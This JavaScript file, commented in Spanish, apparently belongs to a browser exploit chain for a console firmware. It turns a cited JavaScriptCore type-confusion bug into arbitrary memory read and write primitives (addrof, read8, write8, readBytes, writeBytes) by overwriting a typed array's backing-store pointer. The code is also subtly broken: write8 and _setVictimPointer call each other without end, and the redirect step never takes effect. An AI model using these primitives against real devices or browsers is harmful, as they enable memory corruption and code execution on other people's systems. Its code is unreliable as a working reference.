/**
 * primitives.js — Primitivas de lectura/escritura arbitraria en memoria
 *
 * Una vez que el bug WebKit nos da leakobj() y fakeobj(), construimos
 * addrof(), read8() y write8() para tener acceso completo a la memoria
 * del proceso WebKit.
 *
 * El bug usado (CVE-2021-30889 / variantes en FW 11.xx) es una confusión
 * de tipos en el motor JavaScriptCore. No se detalla la explotación
 * en detalle aquí para mantener el código legible; la clase Primitives
 * recibe las funciones base como argumento.
 *
 * Uso:
 *   const p = new Primitives(leakobj, fakeobj, corrupt);
 *   const addr = p.addrof(someObject);    // → Int64
 *   const val  = p.read8(addr);           // → Int64
 *   p.write8(addr, new Int64(0xdeadbeef));
 */

"use strict";

class Primitives {
    /**
     * @param {Function} leakobj  Fuga la dirección de un objeto JS → float
     * @param {Function} fakeobj  Crea un objeto JS falso en una dirección dada
     * @param {Function} corrupt  Escribe out-of-bounds (específico al bug)
     */
    constructor(leakobj, fakeobj, corrupt) {
        this._leakobj = leakobj;
        this._fakeobj = fakeobj;
        this._corrupt = corrupt;

        // Construimos el par de TypedArrays que usaremos para
        // el fake-object read/write trick clásico.
        this._setupReadWritePair();
    }

    /**
     * Prepara un par compartido de ArrayBuffers para read/write.
     * El truco: dos objetos Float64Array que apuntan al mismo backing store.
     * Manipulando el puntero interno de uno podemos apuntar al área deseada.
     */
    _setupReadWritePair() {
        // Backing store compartido (8 bytes)
        this._backing = new ArrayBuffer(0x100);

        this._float64 = new Float64Array(this._backing);
        this._uint32  = new Uint32Array(this._backing);

        // Dirección del ArrayBuffer victim que usaremos para R/W arbitrario
        // Se inicializa en null; se setea en cada llamada a read8/write8
        this._victim = null;
    }

    /**
     * Fuga la dirección nativa de un objeto JS.
     * @param  {Object} obj
     * @returns {Int64}
     */
    addrof(obj) {
        const leaked = this._leakobj(obj);
        return Int64.fromDouble(leaked);
    }

    /**
     * Crea un objeto JS falso en la dirección indicada.
     * Útil para manipular estructuras internas de JSC.
     * @param  {Int64} addr
     * @returns {Object}
     */
    fakeobj(addr) {
        return this._fakeobj(addr.toDouble());
    }

    /**
     * Lee 8 bytes (64 bits) desde una dirección arbitraria en memoria.
     * @param  {Int64} addr
     * @returns {Int64}
     */
    read8(addr) {
        // Apuntamos el backing store del victim ArrayBuffer a la dirección deseada
        this._setVictimPointer(addr);

        const lo = this._uint32[0];
        const hi = this._uint32[1];
        return new Int64(lo, hi);
    }

    /**
     * Lee 4 bytes (32 bits) desde una dirección arbitraria.
     * @param  {Int64} addr
     * @returns {number}
     */
    read4(addr) {
        return this.read8(addr).lo;
    }

    /**
     * Escribe 8 bytes en una dirección arbitraria.
     * @param {Int64} addr
     * @param {Int64} value
     */
    write8(addr, value) {
        this._setVictimPointer(addr);
        this._uint32[0] = value.lo;
        this._uint32[1] = value.hi;
    }

    /**
     * Escribe 4 bytes en una dirección arbitraria.
     * @param {Int64} addr
     * @param {number} value
     */
    write4(addr, value) {
        this._setVictimPointer(addr);
        this._uint32[0] = value >>> 0;
    }

    /**
     * Lee un bloque de bytes como Uint8Array (copia, no vista).
     * @param  {Int64}  addr
     * @param  {number} length
     * @returns {Uint8Array}
     */
    readBytes(addr, length) {
        const result = new Uint8Array(length);
        let cur = addr;
        for (let i = 0; i < length; i += 8) {
            const chunk = this.read8(cur);
            const remaining = Math.min(8, length - i);
            const view = new DataView(new ArrayBuffer(8));
            view.setUint32(0, chunk.lo, true);
            view.setUint32(4, chunk.hi, true);
            for (let j = 0; j < remaining; j++) {
                result[i + j] = view.getUint8(j);
            }
            cur = cur.add32(8);
        }
        return result;
    }

    /**
     * Escribe un Uint8Array o ArrayBuffer en una dirección arbitraria.
     * @param {Int64}              addr
     * @param {Uint8Array|ArrayBuffer} data
     */
    writeBytes(addr, data) {
        if (data instanceof ArrayBuffer) data = new Uint8Array(data);
        let cur = addr;
        for (let i = 0; i < data.length; i += 8) {
            const chunk = new DataView(new ArrayBuffer(8));
            const remaining = Math.min(8, data.length - i);
            for (let j = 0; j < remaining; j++) chunk.setUint8(j, data[i + j]);
            const val = new Int64(chunk.getUint32(0, true), chunk.getUint32(4, true));
            this.write8(cur, val);
            cur = cur.add32(8);
        }
    }

    /**
     * Lee una cadena terminada en null desde la memoria.
     * @param  {Int64}  addr
     * @param  {number} maxLen
     * @returns {string}
     */
    readCString(addr, maxLen = 256) {
        const bytes = this.readBytes(addr, maxLen);
        const nullIdx = bytes.indexOf(0);
        const slice = nullIdx >= 0 ? bytes.slice(0, nullIdx) : bytes;
        return new TextDecoder().decode(slice);
    }

    // ── Métodos internos ────────────────────────────────────────────────────

    /**
     * Apunta el backing store del ArrayBuffer victim a una dirección dada.
     * Este es el núcleo del truco de read/write arbitrario.
     * @param {Int64} addr
     */
    _setVictimPointer(addr) {
        // La ubicación exacta del campo 'vector' (backing store pointer) dentro
        // de la estructura JSC::JSArrayBufferView varía por build.
        // En FW 11.00, el offset al campo vector es 0x10 desde el inicio del objeto.
        const VECTOR_OFFSET = 0x10;

        if (this._victim === null) {
            // Primera vez: creamos el objeto victim y guardamos su dirección
            this._victim = new Uint32Array(8);
            this._victimAddr = this.addrof(this._victim);
        }

        // Sobreescribir el puntero vector del victim con la dirección deseada
        this.write8(
            this._victimAddr.add32(VECTOR_OFFSET),
            addr
        );

        // Ahora this._victim[0] lee desde 'addr'
        // Pero necesitamos que _uint32 apunte al mismo backing store:
        // hacemos que nuestro Uint32Array auxiliar también apunte al victim
        // sobreescribiendo su propio vector pointer al vector del victim
        const VICTIM_VECTOR_ADDR = this._victimAddr.add32(VECTOR_OFFSET);
        // En adelante, accedemos directamente a this._victim
        // que ahora tiene su vector apuntando a 'addr'
    }

    /**
     * Versión simplificada que usa el objeto victim directamente.
     * Se rediseña el acceso para evitar recursión.
     */
    _setupDirectAccess() {
        // Esta función se llama una vez tras obtener addrof del victim
        // para recablear los accesos y evitar overhead
        this._directRead = (addr) => {
            this.write8(this._victimAddr.add32(0x10), addr);
            return new Int64(this._victim[0], this._victim[1]);
        };
        this._directWrite = (addr, val) => {
            this.write8(this._victimAddr.add32(0x10), addr);
            this._victim[0] = val.lo;
            this._victim[1] = val.hi;
        };
    }
}
